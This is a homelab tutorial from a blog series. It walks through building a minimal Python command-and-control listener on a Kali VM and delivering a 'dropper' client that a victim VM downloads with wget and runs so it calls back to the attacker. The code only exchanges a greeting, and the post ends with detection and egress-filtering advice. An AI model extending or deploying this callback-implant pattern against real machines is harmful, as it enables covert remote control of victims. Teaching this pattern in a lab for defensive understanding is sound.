---
title: "Part 11 - Attack 7: Creating a C2 Server"
date: 2026-05-23
description: "Building a simple Python-based Command and Control (C2) server on the attacker machine, deploying a client dropper to the victim Linux workstation, and establishing a persistent callback connection."

tags:
  - cybersecurity
  - homelab
  - na101

categories:
  - cybersecurity
  - homelab writeup
  - networks and attacks 101
---

# Attack 7 — Creating a C2 Server

## Prerequisites

Before starting, make sure the following are in place:

1. VirtualBox or VMware Workstation Pro installed
2. `project-x-linux-client` is turned on and configured
3. `project-x-attacker` is turned on
4. Both VMs are on the `project-x-network` NAT Network (or VMNet8 NAT for VMware)

## Scenario

In this scenario, the attacker (`project-x-attacker`) has already gained a foothold — or is simulating one by assuming the victim has been tricked into downloading a file. The goal now is persistence and control: the attacker builds a lightweight C2 server in Python, compiles a client-side "dropper" that phones home to the attacker machine, and deploys it to `project-x-linux-client`. Once the dropper runs, the victim machine establishes a connection back to the C2 server — giving the attacker a persistent communication channel to issue commands, exfiltrate data, or pivot further into the network.

## Likeliness Meter

![Likeliness Meter](attack7.png)

**Rating: High**

If a host or endpoint gets compromised, attackers will almost certainly drop a backdoor to achieve persistence. C2 infrastructure is a core component of virtually every advanced threat actor's playbook — from nation-state APTs to ransomware groups to opportunistic cybercriminals. The MITRE ATT&CK framework catalogues dozens of C2 techniques, and the detection of unauthorised callback traffic is one of the most valuable capabilities a network security team can develop. Once a C2 channel is established, the attacker maintains control over the victim machine even if the initial access vector is patched or closed.

## Background: Command and Control (C2) Servers

A **Command and Control (C2) server** is a centralised system used by an attacker to maintain communication with compromised machines — also referred to as bots, agents, or implants — within a victim network.

The basic architecture is straightforward:

1. The attacker controls the **C2 server** — a machine listening for incoming connections
2. A **client** (the malware or dropper) is installed on the victim machine
3. The victim machine **calls back** to the C2 server, typically over a common protocol (HTTPS, DNS, HTTP) to blend in with normal traffic
4. The attacker uses the C2 server to send commands to the victim and receive output

Why do attackers use C2 servers instead of maintaining direct access? Because direct connections are fragile — if the initial access vector (a shell, a backdoor port) is closed, access is lost. A C2 client that periodically calls home is resilient: it survives reboots, reconnects automatically, and can be designed to blend into normal outbound traffic patterns.

Real-world C2 frameworks like **Cobalt Strike**, **Metasploit**, and **Sliver** are far more sophisticated than what we're building here — they include encrypted channels, staged payloads, anti-detection techniques, and full feature sets for post-exploitation. What we're building is intentionally basic — the point is to understand the underlying concept, not to replicate a production-grade framework.

## Security Implications

C2 infrastructure gives an attacker:

- **Persistent access** — Even if the initial compromise vector is patched or discovered, the C2 client keeps calling home
- **Remote command execution** — The attacker can run arbitrary commands on the victim machine at any time
- **Data exfiltration** — Files, credentials, and keystrokes can be sent back to the C2 server
- **Lateral movement coordination** — The C2 server can be used to orchestrate attacks against other machines on the same network from the already-compromised host
- **Stealth** — C2 traffic over common protocols (HTTP/HTTPS) blends in with normal outbound web traffic, making detection harder

**The detection opportunity**: Abnormal outbound connections are the primary signal. A machine making regular, periodic connections to an unknown external IP — especially on an unexpected port, or at unusual hours — is a red flag. Network monitoring tools and SIEM rules that baseline normal outbound traffic and alert on anomalies are the most effective detection layer. Egress filtering (blocking all outbound traffic except known-good destinations) is also a strong preventive control.

## Part 1 — Build the C2 Server

All development steps in this section are run on `project-x-attacker` (Kali Linux).

### Step 1 — Create the Project Directory

Navigate to the home directory and create a new folder for our C2 code:

```bash
cd ~ && mkdir evilc2 && cd evilc2
```

### Step 2 — Write the Server Handler (`server.py`)

The server handler is the C2 server itself — it listens on a port for incoming connections from victim machines.

Create the file:

```bash
nano server.py
```

Full `server.py` code:

```python
# server.py
import socket

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # Port to listen on

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Listening on {HOST}:{PORT}")

    conn, addr = server.accept()
    with conn:
        print(f"[+] Connection from {addr}")
        conn.sendall(b"Hello, fellow victim\n")  # Send message to the client
```

A quick breakdown of what each part does:

- `HOST = '0.0.0.0'` — listen for incoming connections on all network interfaces
- `PORT = 4444` — the port the C2 server listens on; chosen to be above 1000 and not a commonly blocked port
- `socket.socket(socket.AF_INET, socket.SOCK_STREAM)` — creates a TCP socket using IPv4
- `server.listen(1)` — sets the server to accept one pending connection at a time
- `server.accept()` — blocks until a victim connects, then returns the connection object
- `conn.sendall(...)` — sends a message back to the connected victim machine

![nano editor on `project-x-attacker` showing the full `server.py` code with `HOST = '0.0.0.0'` and `PORT = 4444` clearly visible.](screenshot1.png)

### Step 3 — Write the Client Handler (`client.py`)

The client handler is the dropper — the file that gets deployed to the victim machine and calls home to the C2 server.

Create the file:

```bash
nano client.py
```

> ⚠️ Before saving, make sure to update `SERVER_IP` to match your `project-x-attacker` machine's actual IP address. Run `ip a` to check it.

Full `client.py` code:

```python
# client.py
import socket

SERVER_IP = '10.0.0.50'  # Change to your attacker machine's IP
PORT = 4444

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, PORT))
    data = s.recv(1024)
    print(data.decode())
```

A quick breakdown:

- `SERVER_IP` — the attacker's IP address; the victim machine will call back to this address
- `s.connect(...)` — initiates the outbound TCP connection to the C2 server
- `s.recv(1024)` — receives up to 1024 bytes of data from the server
- `data.decode()` — decodes the received bytes and prints the message to the terminal

![nano editor showing `client.py` with `SERVER_IP` set to the attacker machine's IP address — confirming the callback target is correctly configured before saving.](screenshot2.png)

### Step 4 — Compile the Client into an Executable (Optional)

In a real attack, the dropper needs to run on the victim's operating system. Since we're targeting `project-x-linux-client` (Ubuntu), Python is already available — so we can deploy `client.py` directly.

For reference, if we were targeting a **Windows machine**, we'd need to compile `client.py` into a `.exe` using **PyInstaller**:

```bash
pip install pyinstaller
pyinstaller --onefile client.py
```

The compiled binary would appear in the `/dist` directory. This is why real-world malware is often written in languages like Go, C, or Rust — they compile natively to any target OS without needing an interpreter installed on the victim machine.

**Since we're targeting Linux, we can skip the compilation step and deploy `client.py` directly.**

## Part 2 — Deploy to `project-x-linux-client`

### Step 5 — Serve the Client File via HTTP

On `project-x-attacker`, navigate to the `evilc2` directory and start a Python HTTP server so the victim machine can download the dropper:

```bash
cd ~/evilc2
python -m http.server 8000
```

![Kali terminal showing the Python HTTP server started on port 8000 — output showing "Serving HTTP on 0.0.0.0 port 8000" confirming the file is being served and ready for download.](screenshot3.png)

### Step 6 — Start the C2 Server Listener

Open a **new terminal tab** on `project-x-attacker`. Navigate to `evilc2`, give `server.py` executable permissions, and start it:

```bash
cd ~/evilc2
chmod +x server.py
python3 server.py
```

The terminal will print `[*] Listening on 0.0.0.0:4444` and wait for an incoming connection.

### Step 7 — Download and Execute the Dropper on the Victim Machine

On `project-x-linux-client`, open a terminal. Navigate to the home directory and download `client.py` from the attacker's HTTP server:

```bash
cd ~
wget http://10.0.0.50:8000/client.py
```

Make the file executable and run it:

```bash
chmod +x client.py
python3 client.py
```

This simulates the victim executing what they think is a legitimate file — but is actually the C2 dropper calling home to the attacker.

![Terminal on `project-x-linux-client` showing the `wget` command downloading `client.py` from `10.0.0.50:8000`, followed by `python3 client.py` running — the message from the C2 server ("Hello, fellow victim") printed to the terminal, confirming the callback succeeded from the victim's side.](screenshot4.png)

### Step 8 — Confirm the Connection on the C2 Server

Switch back to `project-x-attacker` and look at the terminal running `server.py`.

You should see the connection logged:

```
[+] Connection from ('10.0.0.17', XXXXX)
```

![Kali terminal showing the `server.py` output with `[+] Connection from ('10.0.0.17', ...)` printed — confirming the victim machine (`project-x-linux-client`) successfully called back to the C2 server. This is the payoff screenshot of the entire exercise.](screenshot5.png)

The C2 channel is established. The victim machine connected to the attacker's C2 server, received a command (the "Hello" message), and printed the output — a basic but complete proof-of-concept for command and control communication.

## Conclusion

What we built here is about as minimal as a C2 server gets — a Python socket listener and a client that connects once, receives a string, and exits. Real-world C2 frameworks are orders of magnitude more sophisticated: encrypted channels, jitter timers to randomise callback intervals, proxy-aware clients, modular command handlers, and evasion techniques designed to defeat EDR and network monitoring tools.

But the underlying principle is identical. An implant on a victim machine reaches out to an attacker-controlled server. The attacker sends instructions. The victim executes them and sends back output. That loop — compromised machine phones home, attacker issues commands, victim executes — is the backbone of every major post-exploitation framework in use today.

The key takeaway from the blue team side: **monitor your outbound traffic**. A machine making regular connections to an unfamiliar IP on port 4444 (or any non-standard port) is a strong indicator of C2 activity. Baseline your environment's normal outbound traffic patterns, alert on anomalies, and consider egress filtering as a preventive control.

---

*Next up — the final post in this series: Network Layer Monitoring & Prevention, where we flip to the blue team side and apply Arpwatch and Suricata custom rules to detect and block the attacks we've been running across the NA101 section.*
